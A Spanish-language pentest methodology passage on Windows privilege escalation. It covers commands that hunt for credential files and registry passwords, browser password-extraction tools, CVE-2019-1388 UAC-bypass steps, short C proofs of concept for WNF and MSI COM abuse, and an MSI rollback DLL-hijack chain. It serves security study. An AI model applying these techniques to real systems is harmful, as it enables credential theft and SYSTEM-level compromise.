Las bases de datos de Password Safe v3 suelen usar la extensión `.psafe3`. Considera los archivos con nombres coincidentes como posibles bóvedas cifradas; su presencia no demuestra que puedas leerlas, desbloquearlas ni usar las credenciales almacenadas. Al revisar dónde se guardan estos archivos, comprueba los perfiles de usuario accesibles y las raíces configuradas para compartir archivos.

Un archivo KeePass `.kdbx` legible también es solo una pista de que hay una bóveda cifrada. Para desbloquearla se necesita la contraseña maestra real y cualquier archivo de clave o factor de cuenta configurado. Si una revisión autorizada encuentra un par de hashes LM:NT en una entrada, verifica la cuenta indicada y si el hash NT sigue vigente y el servicio NTLM del objetivo lo acepta antes de considerar [pass-the-hash](../ntlm/README.md#pass-the-hash). Una entrada de la bóveda no otorga por sí sola derechos de Administrator o SYSTEM; también deben cumplirse los requisitos de acceso al servicio remoto, los derechos de la cuenta y cualquier paso independiente de ejecución del servicio. El inventario debe indicar la ruta y la legibilidad de la bóveda, no mostrar la base de datos ni las credenciales almacenadas.

Busca todos los archivos propuestos:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Credenciales en la Papelera de reciclaje

Revisa las entradas accesibles de la Papelera de reciclaje en busca de copias de seguridad y archivos de configuración eliminados, así como de archivos cuyos nombres mencionen explícitamente credenciales. Una copia de seguridad útil `.7z`, `.zip` o `.rar` puede tener meses de antigüedad y un nombre común. Windows almacena la ruta original y la fecha de eliminación en un registro `$I`, y el archivo eliminado en su entrada `$R` correspondiente; inspecciona los metadatos y comprueba que la identidad actual tenga acceso de lectura antes de abrir un archivo comprimido. La visibilidad depende del volumen, el SID del usuario y los permisos de los archivos, por lo que una lista vacía no demuestra que no exista ninguna copia de seguridad recuperable. Considera el nombre de un archivo comprimido como candidato a revisión, no como prueba de que contenga un secreto válido.

Un `.pfx` eliminado y accesible también puede ser una pista de **firma de código**. Si contiene una clave privada accesible, esta puede firmar un script de PowerShell modificado; [PowerShell requiere un certificado de firma de código con una clave privada](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), y [las reglas de publicador de AppLocker evalúan la identidad del firmante y el ámbito de la regla](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Para ejecutar el script desde otra cuenta, la identidad actual debe poder modificar el script concreto, debe haber una regla efectiva que acepte la firma resultante para el script y la cuenta de destino, y una tarea programada u otro proceso con privilegios superiores debe ejecutarlo realmente. El nombre de un archivo `.pfx`, el asunto del certificado o un script con permisos de escritura, por sí solos, no demuestran que se cumpla esta cadena. Revisa los metadatos, las ACL, la política y el comando programado antes de abrir material de clave privada o activar la tarea.

Revisa también las bases de datos de perfiles, las notas y los archivos recibidos accesibles de los clientes de mensajería en busca de indicios de credenciales. Una exportación de recuperación de BitLocker puede estar guardada como HTML o TXT, a veces dentro de un archivo de copia de seguridad con nombre. Ese material puede permitir el acceso a otro volumen de datos cifrado que contenga copias de seguridad antiguas; inspecciona el volumen y el archivo solo si tienes autorización. Si una copia de seguridad incluye `NTDS.dit`, la recuperación sin conexión de credenciales de dominio también requiere el hive `SYSTEM` correspondiente, como se describe en el [flujo de trabajo de copias de seguridad y grupos privilegiados](../active-directory-methodology/privileged-groups-and-token-privileges.md). Los nombres de los archivos y un volumen bloqueado, por sí solos, no demuestran que exista una clave de recuperación utilizable o una copia de seguridad del dominio.

Para **recuperar contraseñas** guardadas por varios programas, puedes usar: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Dentro del registro

**Otras posibles claves del registro con credenciales**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extraer claves de openssh del registro.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historial de los navegadores

Deberías buscar bases de datos donde se almacenen contraseñas de **Chrome, Edge o Firefox**.\
Revisa también el historial, los marcadores y los favoritos de los navegadores, ya que puede que allí se almacenen algunas **contraseñas**.

Para el perfil **Default** convencional de Edge del usuario actual, `Login Data` se encuentra en `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, mientras que `Local State` está en el directorio principal `User Data`. [Microsoft documenta la ubicación predeterminada del perfil](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); otro perfil o una directiva `UserDataDir` pueden cambiarla. La presencia de archivos es solo un indicio de que podría haber credenciales: confirma que los archivos se puedan leer, que tengas el contexto DPAPI del usuario correspondiente u otro material de claves autorizado, y que el inicio de sesión guardado pertenezca a una cuenta con más privilegios. Enumerar solo las rutas no requiere abrir la base de datos ni mostrar contraseñas descifradas.

Para Firefox, [Mozilla documenta](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) que `key4.db` y `logins.json` de un perfil son, respectivamente, los archivos de claves y de inicios de sesión cifrados que se usan en conjunto. Su presencia es solo un indicio: comprueba si se pueden leer ambos archivos, si hay entradas guardadas y si una Primary Password protege la clave antes de concluir que las credenciales se pueden usar. Si una credencial recuperada pertenece a una cuenta de dominio, revisa por separado los derechos efectivos de control de grupos de esa cuenta y los [derechos de lectura o descifrado de contraseñas de LAPS](../active-directory-methodology/laps.md) del grupo; los artefactos del navegador por sí solos no demuestran que exista una vía para obtener privilegios de administrador.

Herramientas para extraer contraseñas de los navegadores:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** es una tecnología integrada en el sistema operativo Windows que permite la **comunicación** entre componentes de software escritos en distintos lenguajes. Cada componente COM se **identifica mediante un identificador de clase (CLSID)** y expone su funcionalidad mediante una o más interfaces, identificadas por identificadores de interfaz (IID).

Las clases y las interfaces COM se definen en el registro, bajo **HKEY\CLASSES\ROOT\CLSID** y **HKEY\CLASSES\ROOT\Interface**, respectivamente. Este registro se crea combinando **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Dentro de los CLSID de este registro puedes encontrar la subclave **InProcServer32**, que contiene un **valor predeterminado** que apunta a una **DLL** y un valor llamado **ThreadingModel**, que puede ser **Apartment** (un solo subproceso), **Free** (varios subprocesos), **Both** (uno o varios subprocesos) o **Neutral** (independiente del subproceso).

![Historial de los navegadores - COM DLL Overwriting: Dentro de los CLSID de este registro puedes encontrar la subclave InProcServer32, que contiene un valor predeterminado que apunta a una DLL y un valor...](<../../images/image (729).png>)

Básicamente, si puedes **sobrescribir cualquiera de las DLL** que se van a ejecutar, podrías **escalar privilegios** si esa DLL va a ser ejecutada por otro usuario.

Para aprender cómo usan los atacantes COM Hijacking como mecanismo de persistencia, consulta:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Búsqueda genérica de contraseñas en archivos y el registro**

**Buscar contenido en archivos**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Buscar un archivo con un nombre de archivo determinado**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Buscar en el registro nombres de claves y contraseñas**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Herramientas que buscan contraseñas

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **es un plugin de msf** que he creado para **ejecutar automáticamente todos los módulos POST de metasploit que buscan credenciales** dentro de la víctima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) busca automáticamente todos los archivos que contienen contraseñas mencionados en esta página.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) es otra gran herramienta para extraer contraseñas de un sistema.

La herramienta [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) busca **sesiones**, **nombres de usuario** y **contraseñas** de varias herramientas que guardan estos datos en texto sin cifrar (PuTTY, WinSCP, FileZilla, SuperPuTTY y RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Imagina que **un proceso que se ejecuta como SYSTEM abre un proceso nuevo** (`OpenProcess()`) con **acceso completo**. El mismo proceso **también crea un proceso nuevo** (`CreateProcess()`) **con privilegios bajos, pero que hereda todos los handles abiertos del proceso principal**.\
Entonces, si tienes **acceso completo al proceso con pocos privilegios**, puedes obtener el **handle abierto al proceso privilegiado creado** con `OpenProcess()` e **inyectar un shellcode**.\
[Lee este ejemplo para obtener más información sobre **cómo detectar y explotar esta vulnerabilidad**.](leaked-handle-exploitation.md)\
[Lee [**esta otra publicación** para obtener una explicación más completa sobre cómo probar y abusar de otros handles abiertos de procesos e hilos heredados con distintos niveles de permisos (no solo acceso completo)](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Suplantación del cliente de Named Pipe

Los segmentos de memoria compartida, denominados **pipes**, permiten la comunicación y la transferencia de datos entre procesos.

Windows ofrece una función llamada **Named Pipes**, que permite a procesos no relacionados compartir datos, incluso a través de distintas redes. Esto se asemeja a una arquitectura cliente/servidor, con roles definidos como **servidor de named pipe** y **cliente de named pipe**.

Cuando un **cliente** envía datos a través de un pipe, el **servidor** que lo configuró puede **asumir la identidad** del **cliente**, siempre que tenga los derechos **SeImpersonate** necesarios. Identificar un **proceso privilegiado** que se comunica mediante un pipe que puedas imitar te brinda la oportunidad de **obtener privilegios más altos** al adoptar la identidad de ese proceso cuando interactúe con el pipe que estableciste. Para obtener instrucciones sobre cómo llevar a cabo este ataque, consulta estas guías: [**aquí**](named-pipe-client-impersonation.md) y [**aquí**](#from-high-integrity-to-system).

Además, la siguiente herramienta permite **interceptar la comunicación de un named pipe con una herramienta como Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **y esta herramienta permite enumerar y ver todos los pipes para encontrar privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Escritura remota de DWORD en Telephony tapsrv para lograr RCE

El servicio Telephony (TapiSrv), en modo servidor, expone `\\pipe\\tapsrv` (MS-TRP). Un cliente remoto autenticado puede abusar de la ruta de eventos asíncronos basada en mailslots para convertir `ClientAttach` en una **escritura arbitraria de 4 bytes** en cualquier archivo existente en el que `NETWORK SERVICE` pueda escribir; luego puede obtener derechos de administrador de Telephony y cargar una DLL arbitraria como el servicio. Flujo completo:

- Usa `ClientAttach` con `pszDomainUser` configurado en una ruta existente en la que se pueda escribir → el servicio la abre mediante `CreateFileW(..., OPEN_EXISTING)` y la usa para las escrituras de eventos asíncronos.
- Cada evento escribe en ese handle el `InitContext` controlado por el atacante, establecido mediante `Initialize`. Registra una aplicación de línea con `LRegisterRequestRecipient` (`Req_Func 61`), activa `TRequestMakeCall` (`Req_Func 121`), obtiene los eventos mediante `GetAsyncEvents` (`Req_Func 0`) y luego anula el registro o cierra el servicio para repetir las escrituras de forma determinista.
- Añádete a `[TapiAdministrators]` en `C:\Windows\TAPI\tsec.ini`, vuelve a conectarte y luego llama a `GetUIDllName` con la ruta de una DLL arbitraria para ejecutar `TSPI_providerUIIdentify` como `NETWORK SERVICE`.

Más detalles:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Varios

### Extensiones de archivo que pueden ejecutar cosas en Windows

Consulta la página **[https://filesec.io/](https://filesec.io/)**

### Abuso de Protocol handler / ShellExecute mediante renderizadores Markdown

Los enlaces Markdown en los que se puede hacer clic y que se pasan a `ShellExecuteExW` pueden activar URI handlers peligrosos (`file:`, `ms-appinstaller:` o cualquier esquema registrado) y ejecutar archivos controlados por el atacante como el usuario actual. Consulta:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Supervisión de líneas de comandos para detectar contraseñas**

Al obtener una shell como usuario, puede haber tareas programadas u otros procesos en ejecución que **pasen credenciales en la línea de comandos**. El siguiente script captura las líneas de comandos de los procesos cada dos segundos y compara el estado actual con el anterior, mostrando las diferencias.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Robar contraseñas de los procesos

## De un usuario con pocos privilegios a NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Si tienes acceso a la interfaz gráfica (mediante consola o RDP) y UAC está habilitado, en algunas versiones de Microsoft Windows es posible ejecutar un terminal o cualquier otro proceso como "NT\AUTHORITY SYSTEM" desde un usuario sin privilegios.

Esto permite escalar privilegios y omitir UAC al mismo tiempo con la misma vulnerabilidad. Además, no es necesario instalar nada y el binario utilizado durante el proceso está firmado y publicado por Microsoft.

Algunos de los sistemas afectados son los siguientes:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Para explotar esta vulnerabilidad, es necesario realizar los siguientes pasos:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Tienes todos los archivos y la información necesarios en este repositorio de GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## De nivel de integridad Medium de Administrator a High / UAC Bypass

Lee esto para **aprender sobre los niveles de integridad**:


{{#ref}}
integrity-levels.md
{{#endref}}

Después, **lee esto para aprender sobre UAC y sus bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junctions del directorio de subida hacia una raíz servida

Una aplicación puede crear un subdirectorio de subida predecible, escribir en él un nombre de archivo proporcionado por el usuario y luego procesar el archivo. Si un usuario con privilegios bajos puede eliminar y reemplazar ese subdirectorio por una junction de NTFS antes de la escritura del servidor, esta podría redirigirse a un directorio servido por web. Un script ubicado allí podría ejecutarse con la identidad del servicio web si el servidor ejecuta ese tipo de archivo. Este límite de escritura arbitraria depende de la aplicación; que el directorio de subida permita escrituras o que ya exista una junction no basta para demostrarlo.

Comprueba la construcción exacta de la ruta y el momento en que se realiza en el controlador de subida, los permisos efectivos del usuario para eliminar y crear el subdirectorio, las ACL efectivas del destino, si el escritor sigue los puntos de reanálisis y si el servidor web ejecuta archivos en ese destino. Confirma por separado las identidades de proceso del escritor y del servidor web. Un inventario pasivo puede mostrar las ACL de directorios y los metadatos de reanálisis, pero no puede determinar el comportamiento del controlador ni confirmar un futuro cambio de junction. Si la ejecución se realiza con una cuenta de servicio, inspecciona el **token del proceso real** antes de considerar cualquier ruta independiente que aproveche privilegios del token.

## Limpieza de tareas programadas privilegiadas activada por WNF

Una tarea programada que deniega la ejecución manual aún puede exponer un activador accesible sin privilegios. Al auditar una tarea privilegiada, exporta su XML e inspecciona **todos** los activadores, así como la DACL de la tarea, el principal y la acción. En particular, un `WnfStateChangeTrigger` especifica un estado de Windows Notification Facility (WNF); si ese estado securizable permite al usuario actual publicar una actualización, el usuario puede iniciar indirectamente la tarea con la identidad configurada, incluso con `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Por ejemplo, la tarea Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` se ejecutaba como SYSTEM, aceptaba actualizaciones del estado WNF `7508BCA32C079E41` de un usuario estándar y luego inspeccionaba `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, incluso cuando Recall estaba desactivado.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Para probar la accesibilidad, resuelve `ZwUpdateWnfStateData` desde `ntdll.dll`, envía una actualización vacía para el nombre de estado de ocho bytes y correlaciona el estado devuelto con los datos de última ejecución de la tarea o la actividad de Procmon. La siguiente prueba reducida usa la secuencia de bytes del ejemplo de la tarea Recall; sustituye los bytes exportados para la tarea que se está probando.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Convertir la limpieza recursiva en eliminación privilegiada

La primitiva útil no es solo el trigger, sino una rutina de limpieza privilegiada que acepta un directorio controlado por el atacante. Rastrea la operación desde la enumeración hasta la mutación final: la búsqueda de perfiles/sesiones, los hijos seleccionados mediante comodines, `SHCreateItemFromParsingName` y `IFileOperation::DeleteItem` son indicios claros de que una ruta que ya se comprobó se recorrerá después de forma recursiva. Si los descendientes no se abren en relación con handles de directorio de confianza y se validan antes de eliminarlos, un atacante puede cambiar la resolución entre la enumeración y el uso.<sup>[[43]](#references)</sup>

Combina el trigger WNF con la [sustitución mediante oplock, junction y symlink de Object Manager](#from-folder-contents-delete-to-system-eop) descrita abajo: el oplock pausa el proceso de limpieza después de que seleccione el hijo legítimo, mientras que se reemplaza el ancestro modificable para que la eliminación privilegiada, al reanudarse, resuelva la ruta a través de `\RPC Control` hasta el objetivo protegido. En la cadena de Recall, esto permitió que SYSTEM eliminara `C:\Config.Msi`, como se requiere para la técnica documentada de rollback de MSI.<sup>[[31]](#references)[[43]](#references)</sup>

### Los descendientes anidados eluden las correcciones superficiales para reparse points

Validar solo la raíz controlada por el atacante y su hijo inmediato no protege una eliminación recursiva basada en rutas. Mantén legítimos esos objetos comprobados y mueve la sustitución mediante junction/oplock a un hijo adicional situado debajo de ellos; `IFileOperation::DeleteItem` acabará llegando al descendiente no validado y seguirá su nuevo destino. CVE-2026-20941 fue precisamente este tipo de corrección incompleta: tras el primer parche de Recall, se validaban `UKP` y el directorio con formato GUID, pero se conservaba la antigua operación de eliminación recursiva.<sup>[[43]](#references)</sup>

El patrón seguro consiste en abrir **todos los descendientes** en relación con un handle de directorio de confianza, obtener y verificar la ruta/objeto resuelto final y aplicar la disposición de eliminación a ese handle verificado. No valides un prefijo para luego volver a una eliminación recursiva basada en rutas. Al revisar parches, inspecciona también las estructuras en el punto real de llamada: en este caso, la inspección en tiempo de ejecución de `OBJECT_ATTRIBUTES` en `NtCreateFile` mostró un `RootDirectory` no nulo y un nombre relativo `{GUID}\\secure_file.lock`, lo que refutó el engañoso resultado del decompilador que sugería una segunda primitiva `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## De la eliminación, movimiento o cambio de nombre arbitrarios de carpetas a SYSTEM EoP

La técnica descrita [**en esta entrada de blog**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), con código de exploit [**disponible aquí**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

El ataque consiste básicamente en abusar de la función de rollback de Windows Installer para reemplazar archivos legítimos por archivos maliciosos durante la desinstalación. Para ello, el atacante debe crear un **instalador MSI malicioso** que se utilizará para secuestrar la carpeta `C:\Config.Msi`. Más adelante, Windows Installer la usará para almacenar archivos de rollback durante la desinstalación de otros paquetes MSI; los archivos de rollback se habrán modificado para contener el payload malicioso.

### Inyección de rutas de limpieza COM de Windows Installer (CVE-2025-27727)

Un cliente con pocos privilegios puede acceder al servicio `msiexec.exe` de SYSTEM mediante el objeto COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). La ingeniería inversa identificó las llamadas relevantes de `IMsiServer`: `MsiBeginTransactionW` en el desplazamiento `0xA0` de la vtable, `SetEEUIDirectoryAndFilter` en `0xC8` y `CleanupTempPackages` en `0x50`. Estos nombres y desplazamientos se obtuvieron mediante ingeniería inversa y pueden variar según la compilación.<sup>[[41]](#references)</sup>

Para un usuario que no sea administrador, `SetEEUIDirectoryAndFilter` suplanta al caller solo mientras abre la ruta proporcionada con `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` y `FILE_FLAG_OPEN_REPARSE_POINT`. Esto demuestra que el caller puede eliminar el directorio y evita seguir un reparse point, pero **no** vincula el objeto de archivo comprobado con la limpieza posterior ni demuestra que Windows Installer lo haya creado.<sup>[[41]](#references)</sup>

Después de `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` programa la ruta como carpeta, independientemente del argumento de filtro del caller. El servicio escribe un valor con nombre de tipo `REG_DWORD` en `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: el nombre del valor es la ruta controlada por el caller y el dato `0x00000002` es el indicador de carpeta. A continuación, `CleanupTempPackages(NULL, FALSE)` inicia directamente la limpieza. Su worker con privilegios elevados enumera los valores del registro y pasa las entradas de carpetas a `FDeleteFolder` recursivo sin comprobar el origen de las rutas. Si la eliminación normal falla, el código también llama a `LockdownPath`, borra los atributos de archivo y vuelve a intentarlo.<sup>[[41]](#references)</sup>

La secuencia mínima de llamadas recuperada de `msi.dll` es:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

La primitiva útil es la reutilización de rutas, no la redirección mediante junction. Registra un `C:\Config.Msi` creado por el atacante, elimínalo y deja que Windows Installer vuelva a crear la misma ruta con datos de rollback protegidos. La limpieza confía en el nombre obsoleto `TempPackages` y elimina el nuevo directorio como SYSTEM. Esto evita los límites previstos por `FILE_FLAG_OPEN_REPARSE_POINT` y la mitigación de confianza en la redirección, porque no se necesita ningún reparse point.<sup>[[41]](#references)</sup>

Esta primitiva de eliminación encaja en la cadena de rollback siguiente: conserva el registro independiente de `Installer\Folders`, elimina el `C:\Config.Msi` protegido, vuelve a crearlo con una NULL DACL y conserva un handle con permiso `WRITE_DAC` antes de que el instalador aplique una DACL más restrictiva. El handle abierto de antemano puede restaurar una DACL permisiva con `NtSetSecurityObject`, tras lo cual se puede reemplazar el `.rbs` generado antes de que se reanude el rollback.<sup>[[41]](#references)</sup>

Microsoft corrigió esta ruta impidiendo que `CMsiTransaction::SetEEUIDirectoryAndFilter` llame a `ScheduleFileOrFolderDelete` cuando la nueva feature gate está habilitada. La llamada COM aún puede devolver éxito, pero ya no agrega la ruta controlada por el atacante a `TempPackages`. Aplica las actualizaciones de seguridad de Windows de abril de 2025 en lugar de usar el retorno exitoso del método como prueba de que se aplicó el parche.<sup>[[41]](#references)[[42]](#references)</sup>

La técnica resumida es la siguiente:

1. **Etapa 1 – Preparación del hijack (dejar `C:\Config.Msi` vacío)**

- Paso 1: Instalar el MSI
    - Crea un `.msi` que instale un archivo inocuo (por ejemplo, `dummy.txt`) en una carpeta con permisos de escritura (`TARGETDIR`).
    - Marca el instalador como **"UAC Compliant"**, para que un **usuario no administrador** pueda ejecutarlo.
    - Mantén abierto un **handle** al archivo después de la instalación.

- Paso 2: Iniciar la desinstalación
    - Desinstala el mismo `.msi`.
    - El proceso de desinstalación empieza a mover archivos a `C:\Config.Msi` y a cambiarles el nombre por archivos `.rbf` (copias de seguridad de rollback).
    - **Consulta el handle abierto del archivo** usando `GetFinalPathNameByHandle` para detectar cuándo el archivo pasa a ser `C:\Config.Msi\<random>.rbf`.

- Paso 3: Sincronización personalizada
    - El `.msi` incluye una **acción personalizada de desinstalación (`SyncOnRbfWritten`)** que:
        - Indica cuándo se ha escrito el `.rbf`.
        - Después, **espera** a otro evento antes de continuar con la desinstalación.

- Paso 4: Impedir la eliminación del `.rbf`
    - Cuando recibas la señal, **abre el archivo `.rbf`** sin `FILE_SHARE_DELETE`; esto **impide que se elimine**.
    - Después, **envía la señal de vuelta** para que la desinstalación pueda terminar.
    - Windows Installer no puede eliminar el `.rbf` y, como no puede eliminar todo el contenido, **no elimina `C:\Config.Msi`**.

- Paso 5: Eliminar manualmente el `.rbf`
    - Tú, el atacante, eliminas manualmente el archivo `.rbf`.
    - Ahora **`C:\Config.Msi` está vacío**, listo para el hijack.

> En este punto, **activa la vulnerabilidad de eliminación arbitraria de carpetas con privilegios de SYSTEM** para eliminar `C:\Config.Msi`.

2. **Etapa 2 – Reemplazar los scripts de rollback por scripts maliciosos**

- Paso 6: Volver a crear `C:\Config.Msi` con ACL débiles
    - Vuelve a crear la carpeta `C:\Config.Msi`.
    - Configura **DACL débiles** (por ejemplo, Everyone:F) y **mantén abierto un handle** con `WRITE_DAC`.

- Paso 7: Ejecutar otra instalación
    - Instala de nuevo el `.msi`, con:
        - `TARGETDIR`: ubicación con permisos de escritura.
        - `ERROROUT`: una variable que provoca un fallo forzado.
    - Esta instalación se usará para volver a activar el **rollback**, que lee los archivos `.rbs` y `.rbf`.

- Paso 8: Detectar el archivo `.rbs`
    - Usa `ReadDirectoryChangesW` para supervisar `C:\Config.Msi` hasta que aparezca un nuevo `.rbs`.
    - Captura su nombre de archivo.

- Paso 9: Sincronizar antes del rollback
    - El `.msi` contiene una **acción personalizada de instalación (`SyncBeforeRollback`)** que:
        - Señala un evento cuando se crea el `.rbs`.
        - Después, **espera** antes de continuar.

- Paso 10: Volver a aplicar las ACL débiles
    - Después de recibir el evento de creación del `.rbs`:
        - Windows Installer **vuelve a aplicar ACL fuertes** a `C:\Config.Msi`.
        - Pero, como todavía tienes un handle con `WRITE_DAC`, puedes **volver a aplicar ACL débiles**.

> Las ACL **solo se aplican al abrir un handle**, así que aún puedes escribir en la carpeta.

- Paso 11: Colocar archivos `.rbs` y `.rbf` falsos
    - Sobrescribe el archivo `.rbs` con un **script de rollback falso** que indique a Windows que:
        - Restaure tu archivo `.rbf` (DLL maliciosa) en una **ubicación privilegiada** (por ejemplo, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Coloca tu `.rbf` falso, que contiene una **DLL de payload malicioso con privilegios de SYSTEM**.

- Paso 12: Activar el rollback
    - Envía la señal del evento de sincronización para que el instalador reanude el proceso.
    - Se configura una **acción personalizada de tipo 19 (`ErrorOut`)** para que **falle la instalación intencionalmente** en un punto conocido.
    - Esto inicia el **rollback**.

- Paso 13: SYSTEM instala tu DLL
    - Windows Installer:
        - Lee tu `.rbs` malicioso.
        - Copia tu DLL `.rbf` en la ubicación de destino.
    - Ahora tienes tu **DLL maliciosa en una ruta desde la que la carga SYSTEM**.

- Paso final: Ejecutar código como SYSTEM
    - Ejecuta un **binario de autoelevación confiable** (por ejemplo, `osk.exe`) que cargue la DLL cuyo hijack realizaste.
    - **¡Boom!** Tu código se ejecuta **como SYSTEM**.


### De la eliminación, el movimiento o el cambio de nombre arbitrarios de archivos a SYSTEM EoP

